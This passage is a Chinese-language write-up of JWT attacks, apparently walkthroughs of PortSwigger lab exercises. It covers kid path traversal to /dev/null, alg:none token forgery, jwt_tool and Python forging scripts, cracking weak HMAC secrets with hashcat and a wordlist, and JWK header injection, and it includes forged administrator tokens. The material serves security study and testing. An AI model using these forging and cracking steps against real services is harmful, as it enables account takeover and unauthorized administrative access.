<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;keys&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;kty&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RSA&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;e&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;AQAB&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;n&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;kty&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RSA&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;e&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;AQAB&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token property" style="color:#36acaa">&quot;n&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>此类<code> JWK 集合</code>有时会通过路径公开，例如 <code>/.well-known/jwks.json</code></p>
<p>更安全的网站只会从受信任的域中获取密钥，但有时你可以利用 URL 解析差异来绕过这种过滤</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="通过kid注入自签名">通过<code>kid</code>注入自签名<a href="#通过kid注入自签名" class="hash-link" aria-label="通过kid注入自签名的直接链接" title="通过kid注入自签名的直接链接">​</a></h3>
<p><code>JWT </code>的头部可能包含一个 <code>kid</code> （密钥 ID）参数，这用于服务器在<strong>验证签名</strong>时识别使用哪个密钥</p>
<p>验证密钥通常存储为<code> JWK 集合</code>。在这种情况下，服务器可能只需查找与令牌相同的 <code>kid</code> 的 <code>JWK</code>。然而，<code>JWS </code>规范并未定义此 ID 的具体结构——它只是开发者选择的任意字符串。例如，他们可能会使用 <code>kid</code> 参数指向数据库中的特定条目，甚至是指向文件名</p>
<p>如果指向的是一个文件名，那么我们可以进行目录遍历指向我们已知内容的文件。比如：<code>linux</code>下的<code>/dev/null</code>指向空字符串</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;../../../../dev/null&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;typ&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;JWT&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;alg&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;HS256&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;k&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果服务器支持对称算法对<code>JWT</code>进行签名，那我们将<code>kid</code>文件指向<code>/dev/null</code>，然后自己签名也用<code>空字符串</code>就可以了</p>
<p>如果服务器将验证密钥存储在数据库中， <code>kid</code> 头部参数也可能有<code> SQL 注入</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="labs">labs<a href="#labs" class="hash-link" aria-label="labs的直接链接" title="labs的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="未经验证的签名">未经验证的签名<a href="#未经验证的签名" class="hash-link" aria-label="未经验证的签名的直接链接" title="未经验证的签名的直接链接">​</a></h3>
<p>直接修改<code>payload</code>部分，因为根本没有验证签名</p>
<p><img decoding="async" loading="lazy" alt="image-20250512204526320" src="/assets/images/image-20250512204526320-d8273451fbb8bd836d76c17dcba06ede.png" width="1528" height="753" class="img_ev3q"></p>
<p>替换payload就行</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ewogICAgImlzcyI6ICJwb3J0c3dpZ2dlciIsCiAgICAiZXhwIjogMTc0NzA1NzMxMywKICAgICJzdWIiOiAiYWRtaW5pc3RyYXRvciIKfQ</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="缺陷的签名认证">缺陷的签名认证<a href="#缺陷的签名认证" class="hash-link" aria-label="缺陷的签名认证的直接链接" title="缺陷的签名认证的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="image-20250512202001564" src="/assets/images/image-20250512202001564-fcca79cb18fb658dcd818ac739451fa8.png" width="1477" height="772" class="img_ev3q"></p>
<p>将头部的<code>alg</code>（签名的算法），改为<code>none</code>，并删除最后的签名部分</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">session=eyJraWQiOiI1NzA1YWVkZi0wYmY5LTRjZWMtYTg1MC04YjM0NjViYzVmZTAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzA1NTc1MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20250512202223633" src="/assets/images/image-20250512202223633-eaaa0e620880eebd82f095d0b2032642.png" width="1666" height="565" class="img_ev3q"></p>
<p>成功到管理界面</p>
<p><img decoding="async" loading="lazy" alt="image-20250512202317381" src="/assets/images/image-20250512202317381-ba5c37a0bebc55a527b59dcb4c4dff0c.png" width="1503" height="751" class="img_ev3q"></p>
<p>或者使用<code>jwt_tool</code>工具：<a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener noreferrer">https://github.com/ticarpi/jwt_tool</a></p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 jwt_tool.py eyJraWQiOiIzYmNkZTA0MC04NzA0LTRkZDUtOGZiZi0xZDA4YWFiYTRkNmMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzA1MjUzMCwic3ViIjoid2llbmVyIn0.NE7wTIt_begtJ2C7yIyUi0HhACUQ5G4x3H7QBrEkl9T-ouOCNzVDLSpEUPDYf-SNZIZRFXeTo-M5xtSfJY4efscBaufKo12TfkIqcXARmv2nAyCb5qUwDf5Nf_32WvKkiBgkyJZL_cUtC0IN5SQSN98NoH5xvzU3USHLG8xNg5LwHzmomUsddvj7gCgBYDcVDWljMxCxVVZKkFNWAF6KMUFRgYUTf8eCY3KL53mfT3fFSeUyVmyZa54ET8XkoSNB6LkrPWtVzO-cqug5Zq2LD2TvCh1SaQ_0pdm-aK4ymrN8czbo6sdvwDkhjVfs2p-jVVRAUfPax8y9rxGVgpB2Dg -X a -I -pc sub -pv administrator</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> jwt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;iss&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;portswigger&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;exp&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1747056991</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;sub&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;administrator&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">headers </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;kid&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;caad9141-602e-49f6-b821-0e6351113cc9&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token string" style="color:#e3116c">&quot;alg&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;none&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">json_web_token </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> jwt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">key</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">algorithm</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;none&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">headers</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">headers</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">json_web_token</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="弱密钥绕过验证">弱密钥绕过验证<a href="#弱密钥绕过验证" class="hash-link" aria-label="弱密钥绕过验证的直接链接" title="弱密钥绕过验证的直接链接">​</a></h3>
<p><code>JwtCrack</code>工具</p>
<p>字典：<a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list" target="_blank" rel="noopener noreferrer">https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list</a></p>
<p><img decoding="async" loading="lazy" alt="image-20250519143626677" src="/assets/images/image-20250519143626677-f705b516e5c8b6c7a1d59bb4279c8507.png" width="1827" height="844" class="img_ev3q"></p>
<p>爆破出密钥：<code>secret1</code></p>
<p>然后就可以任意修改payload部分</p>
<p><img decoding="async" loading="lazy" alt="image-20250519143816646" src="/assets/images/image-20250519143816646-b884abef448f1053077bf6c82d9ba950.png" width="1510" height="755" class="img_ev3q"></p>
<p>payload</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">eyJraWQiOiJjNTQwMzdmNi01ZWY4LTRjMmUtOTk1ZC0zYjljOGRlYzI1Y2UiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzY0MDEwMywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ii16Bg3LwjBxL4nivhOJX1c2iJGQsyjsdtflphA8UfQ</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>hashcat</code></p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -a 0 -m 16500 eyJraWQiOiJjNTQwMzdmNi01ZWY4LTRjMmUtOTk1ZC0zYjljOGRlYzI1Y2UiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzY0MDEwMywic3ViIjoiYWR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">taW5pc3RyYXRvciJ9.Ii16Bg3LwjBxL4nivhOJX1c2iJGQsyjsdtflphA8UfQ jwt.secrets.list</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20250519144420533" src="/assets/images/image-20250519144420533-571240375f558109cadc607eb9672909.png" width="1347" height="582" class="img_ev3q"></p>
<p><code>john</code></p>
<p><img decoding="async" loading="lazy" alt="image-20250519144536874" src="/assets/images/image-20250519144536874-4feaccbd89f3c332a52bfd5453212eb0.png" width="1077" height="305" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jwk-头部注入">JWK 头部注入<a href="#jwk-头部注入" class="hash-link" aria-label="JWK 头部注入的直接链接" title="JWK 头部注入的直接链接">​</a></h3>
<p>初始头部信息</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;6f5da047-9ba5-480b-89dd-a6de2d27689e&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;alg&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;RS256&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用<code>JWT editor</code>插件</p>
<p>生成一个RSA的密钥</p>
<p><img decoding="async" loading="lazy" alt="image-20250519153338775" src="/assets/images/image-20250519153338775-cfaeda71c0473743b0dc9b01ef67cbe4.png" width="825" height="747" class="img_ev3q"></p>
<p>选择攻击，添加进入<code>JWK</code></p>
<p><img decoding="async" loading="lazy" alt="image-20250519153622309" src="/assets/images/image-20250519153622309-2f06c68923825a82138054d6bf0d6d3a.png" width="752" height="801" class="img_ev3q"></p>
<p>将<code>payload</code>中的sub参数改成<code>administrator</code></p>
<p>修改后的头部</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1e00189d-3bc9-49a5-9605-03f0df893a5c&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;typ&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;JWT&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;alg&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RS256&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;jwk&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;kty&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;RSA&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;e&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;AQAB&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;kid&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1e00189d-3bc9-49a5-9605-03f0df893a5c&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;n&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" 